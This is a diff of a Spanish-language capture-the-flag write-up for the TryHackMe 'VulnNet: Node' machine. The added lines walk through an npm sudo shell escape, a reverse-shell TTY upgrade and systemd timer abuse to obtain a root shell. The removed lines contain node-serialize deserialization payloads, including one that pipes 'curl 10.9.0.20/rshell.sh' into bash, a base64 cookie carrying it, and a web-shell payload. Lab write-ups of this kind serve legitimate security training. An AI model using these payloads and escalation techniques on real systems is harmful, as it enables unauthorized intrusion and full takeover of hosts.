@@ -140,7 +140,7 @@ ID           Response   Lines    Word       Chars       Payload
 
 ![Burp](/assets/images/thm-writeup-vuln/vuln_burp_root.png)
 
-## 6. Exploit
+## 5. Exploit
 
 - Con la información obtenida procedemos a crear una **_rshell.sh_**, desde la máquina atacante, como se observa a continuación:
 
@@ -179,56 +179,128 @@ listening on [any] 2222 ...
 
 ![Burp](/assets/images/thm-writeup-vuln/vuln_exploit.png)
 
+## 6. Bandera de usuario
 
-
-## 5. Bandera de usuario
-
-- Listamos con **_ls_** y encontramos el archivo **_user.txt_**:
-
-![usr](/assets/images/thm-writeup-library/library_usr.png)
-
----
-
-## 6. Bandera root
-
-![usr](/assets/images/thm-writeup-library/vuln_root1.png)
-
-
-
-![usr](/assets/images/thm-writeup-library/vuln_root2.png)
-
-
-
-- Búsqueda de vulnerabilidades con el comando **_sudo -l_**:
-
-![root](/assets/images/thm-writeup-library/library_ls.png)
-
-- Creación del binario **_zipfile.py_**, desde la máquina atacante, con el siguiente contenido que nos va a escalar una **_bash_** como root:
+- Buscamos la forma de escalar privilegios con el comando **_sudo -l_**, en la salida podemos ver que se puerde ejecutar **_npm_** como **_usr_**:
 
 ```css
-library_ls.pngimport os
+sudo -l
+Matching Defaults entries for www on vulnnet-node:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
-ZIP_DEFLATED = 1
-
-def ZipFile(param1, param2, param3):
-        print(os.system('/bin/bash'))
+User www may run the following commands on vulnnet-node:
+    (serv-manage) NOPASSWD: /usr/bin/npm
 ```
 
-- Procedemos a compartirlo con un servidor en **_python_**
+---
 
-![root](/assets/images/thm-writeup-library/library_server.png)
+- Buscamos en GTFOBins como podemos ejecutar el binario /npm como super usuario <https://gtfobins.github.io/gtfobins/npm/>
+
+![gtfobins](/assets/images/thm-writeup-vuln/vuln_gtfobins.png)
+
+- Ejecutamos lo indicado en la imagen anterior:
+
+```css
+$ TF=$(mktemp -d)
+$ echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
+$ chmod +x $TF
+$ sudo -u serv-manage /usr/bin/npm -C $TF --unsafe-perm i
+$ locate user.txt
+$ cat usr.txt
+THM{[??????}
+```
 
 ---
 
-- Descargamos el archivo creado en la máquina con **_wget_**:
+## 7. Bandera root
 
-![wget](/assets/images/thm-writeup-library/library_wget.png)
+- Tratamiento de la bash para poder utilizar las diferentes funciones necesarias para trabajar de manera comoda:
+
+```css
+$ script /dev/null -c bash
+Script started, file is /dev/null
+
+[crtl z]
+
+/$ ^Z
+zsh: suspended  nc -nlvp 2222
+
+[reset y xterm]
+
+~$> stty raw -echo; fg
+
+[1]  + continued  nc -nlvp 2222
+                              reset
+reset: unknown terminal type unknown
+Terminal type? xterm
+
+[Exportamos las variables de entorno]
+
+/$ export TERM=xterm
+/$ export SHELL=bash
+
+[Consultamos en la máquina atacante las filas y columnas]
+
+stty size
+27 97
+
+[Pasamos la configuración anterior a la reverse shell]
+
+:/$ stty rows 40 columns 123
+```
 
 ---
 
-- Ejecutamos el script **_bak.py_** y obtenemos la bandera root:
+- Buscamos la forma de escalar privilegios con el comando **_sudo -l_**, en la salida observamos lo siguiente:
 
-![root](/assets/images/thm-writeup-library/library_root.png)
+```css
+serv-manage@vulnnet-node:~$ sudo -l
+Matching Defaults entries for serv-manage on vulnnet-node:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User serv-manage may run the following commands on vulnnet-node:
+    (root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
+    (root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
+    (root) NOPASSWD: /bin/systemctl daemon-reload
+```
+
+---
+
+- Modificamos el script **_vulnnet-auto.timer_**, cambiando el tiempo de ejecución de 30 a 1 minuto:
+
+![Vulnet-timer](/assets/images/thm-writeup-vuln/vuln_root3.png)
+
+---
+
+- Modificamos el script **_vulnet-job.service_**, el cual es llamado con el script de la imagen anterior, para que cree una **_bash_** como usuario **_root_**
+
+![Vulnet-job](/assets/images/thm-writeup-vuln/vuln_root2.png)
+
+---
+
+- En este punto procedemos a detener el servicio **_vulnnet-auto.timer_** y reiniciarlo como se observa a continuación:
+
+```css
+serv-manage@vulnnet-node:~$ sudo /bin/systemctl stop vulnnet-auto.timer
+serv-manage@vulnnet-node:~$ sudo /bin/systemctl daemon-reload
+serv-manage@vulnnet-node:~$ sudo /bin/systemctl start vulnnet-auto.timer
+```
+
+---
+
+- De acuerdo con la modificación del tiempo, esperamos 1 minuto y revisamos si la **_bashroot_**, fue creada:
+
+```css
+serv-manage@vulnnet-node:~$ /tmp/bashroot -p
+```
+
+---
+
+- Llegado a este punto tenemos acceso como usuario con privelegios **_root_**
+
+![Vulnet-job](/assets/images/thm-writeup-vuln/vuln_root4.png)
 
 ---
 
@@ -236,28 +308,8 @@ def ZipFile(param1, param2, param3):
 
 - Writeup:
 
-<https://r4bb1t.medium.com/library-write-up-7dd5d5c5a9eb>
+<https://titus74.com/thm-writeup-vulnnet-node/>
 
-\_$$ND_FUNC$$\_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()
+- Gtfobins
 
-\_$$ND_FUNC$$\_function (){\n \t require('child_process').exec('curl 10.9.0.20/rshell.sh | bash', function(error, stdout, stderr) { console.log(stdout) });\n }()
-
-{"username":"\_$$ND_FUNC$$\_function(){const http = require('http'); const url = require('10.9.0.20'); const ps = require('child_process'); http.createServer(function (req, res) { var queryObject = url.parse(req.url,true).query; var cmd = queryObject['cmd']; try { ps.exec(cmd, function(error, stdout, stderr) { res.end(stdout); }); } catch (error) { return; }}).listen(4444); }()","isGuest":false,"encoding": "utf-8"}
-
-{"username":"\_$$ND_FUNC$$\_function (){\n \t require('child_process').exec('ls', function(error, stdout, stderr) { console.log(stdout) });}()","isGuest":false,"encoding": "utf-8"}
-
-eyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbiAoKXtcbiBcdCByZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYygnY3VybCAxMC45LjAuMjAvcnNoZWxsLnNoIHwgYmFzaCcsIGZ1bmN0aW9uKGVycm9yLCBzdGRvdXQsIHN0ZGVycikgeyBjb25zb2xlLmxvZyhzdGRvdXQpIH0pO1xuIH0oKSIsImlzR3Vlc3QiOmZhbHNlLCJlbmNvZGluZyI6ICJ1dGYtOCJ9
-
-GET / HTTP/1.1
-Host: 10.10.251.107:8080
-User-Agent: Mozilla/5.0 (X11; Linux x86*64; rv:91.0) Gecko/20100101 Firefox/91.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/\_;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Connection: close
-Cookie: session=eyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbiAoKXtcbiBcdCByZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYygnY3VybCAxMC45LjAuMjAvcnNoZWxsLnNoIHwgYmFzaCcsIGZ1bmN0aW9uKGVycm9yLCBzdGRvdXQsIHN0ZGVycikgeyBjb25zb2xlLmxvZyhzdGRvdXQpIH0pO1xuIH0oKSIsImlzR3Vlc3QiOmZhbHNlLCJlbmNvZGluZyI6ICJ1dGYtOCJ9
-Upgrade-Insecure-Requests: 1
-If-None-Match: W/"1daf-dPXia8DLlOwYnTXebWSDo/Cj9Co"
-Cache-Control: max-age=0
-
-"\_$$ND_FUNC$$\_function(){const http = require('http'); const url = require('10.9.0.20'); const ps = require('child_process'); http.createServer(function (req, res) { var queryObject = url.parse(req.url,true).query; var cmd = queryObject['cmd']; try { ps.exec(cmd, function(error, stdout, stderr) { res.end(stdout); }); } catch (error) { return; }}).listen(4444); }()"
+<https://gtfobins.github.io/gtfobins/npm/>
